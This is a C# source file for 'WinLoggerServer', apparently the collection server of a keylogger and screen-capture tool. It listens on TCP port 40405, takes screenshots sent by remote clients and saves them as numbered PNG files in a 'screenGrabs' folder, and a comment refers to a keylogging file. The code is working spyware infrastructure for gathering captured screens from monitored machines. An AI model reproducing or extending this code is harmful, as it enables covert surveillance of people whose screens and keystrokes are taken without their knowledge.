/* 
Used socket code from URL=[https://docs.microsoft.com/en-us/dotnet/framework/network-programming/synchronous-server-socket-example]
*/

using System;
using System.IO;
using System.Reflection;
using System.Net;
using System.Net.Sockets;  
using System.Text;  
using System.Drawing;

public static class Globals
{
    public const Int32 screenPort = 40405;
}

public class WinLoggerServer {  

    // Incoming data from the client.  
		public static void screenListen() {  
        // Data buffer for incoming data.  
        byte[] bytes = new Byte[1048576];  
	    int index = 0;
        // Establish the local endpoint for the socket.
        IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());  
        IPAddress ipAddress = ipHostInfo.AddressList[0];
        IPEndPoint localEndPoint = new IPEndPoint(ipAddress, Globals.screenPort);  

        // Create a TCP/IP socket.  
        Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);  
		string curDirectory = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string foldDir = System.IO.Path.Combine(curDirectory, "screenGrabs");
		System.IO.Directory.CreateDirectory(foldDir);
        // Bind the socket to the local endpoint and   
        // listen for incoming connections.  
        try {  
            listener.Bind(localEndPoint);  
            listener.Listen(10);  

            // Start listening for connections.  
            while (true) {
                Console.WriteLine("Waiting for a connection...");  
                // Program is suspended while waiting for an incoming connection.  
                Socket handler = listener.Accept();  

                // An incoming connection needs to be processed.  
                int bytesRec = handler.Receive(bytes);  
				Image screenGrab;
				using (var memStream = new MemoryStream(bytes))
				{
					screenGrab = Image.FromStream(memStream);
				}
                string append = "logFileLine" + index.ToString() + ".png";
                // Append text to the keylogging file.
				string screenfp = System.IO.Path.Combine(foldDir, append);
				index++;
				screenGrab.Save(screenfp);
                handler.Shutdown(SocketShutdown.Both);  
                handler.Close();  
            }  

        } catch (Exception e) {Console.WriteLine(e.ToString());}
    }  

    public static int Main(String[] args) {  
		screenListen();
        return 0;  
    }  
}